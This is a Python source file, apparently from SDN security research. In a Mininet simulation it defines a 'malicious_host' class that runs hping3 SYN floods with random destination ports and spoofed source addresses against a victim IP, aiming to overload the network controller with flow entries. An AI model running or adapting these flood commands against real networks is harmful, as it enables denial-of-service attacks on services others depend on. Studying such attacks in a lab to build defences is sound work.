from mininet.net import Mininet
from time import sleep
import time
from datetime import datetime
from random import randrange, choice, random, randint, uniform


# ip can be in the same subnet (means that the first 3 octets are the same)
# or in different subnet (means that the first 3 octets are different
# TODO consider which case is better for the attack
# attack ip needs to be in the SDN since it floods the controller and do not build a flow it is useless
def ip_generator():

    ip = ".".join(["10","0","0",str(randrange(1,2))])
    return ip
   
# attack can be on the different ports in the same IP 
def port_generator():
    return randrange(1024, 65535)
  

class malicious_host():
  def __init__(self,name, net, idle_timeout) -> None:
    self.net = net
    self.name = name
    self.idle_timeout = idle_timeout
    self.attacks = []
    
    
    
  # This attack is to send a lot of flow entries to the switch in different ports with same IP
  # different dest_port 60
  def attack_controller_port(self, attack_duration, attack_number , victim_ip):
    start_time = time.time()
    
    count = 0
    idle_timeout = 10
    while( count<80):
      for i in range(10):
        attack_port = randint(80, 65000)
        attack = f'hping3 -c 2 -S -p {attack_port} -s 5002 {victim_ip}'
        self.attacks.append(attack)
      for j in self.attacks:
        self.net.cmd(j)
      count = len(self.attacks)
      print(len(self.attacks))
      sleep(4)
    
    # different source ip
    # TODO thıs attack needs real Ip addresses from SDN
    
  def attack_controller_ip(self, attack_duration, attack_number , victim_ip):
    #h1 hping3 -c 10 -S -p 9000 -a 192.168.1.100 10.0.0.2 can be used for IP attack
    start_time = time.time()
    count = 0
    while( count<80):
      for i in range(10):
        attack_port = randint(80, 65000)
        attack = f'hping3 -d 100 -a 10.0.0.1 -s {attack_port} -p 80 -c 2 {victim_ip}'
        self.attacks.append(attack)
      for j in self.attacks:
        self.net.cmd(j)
      count = len(self.attacks)
      print(len(self.attacks))
      sleep(2)
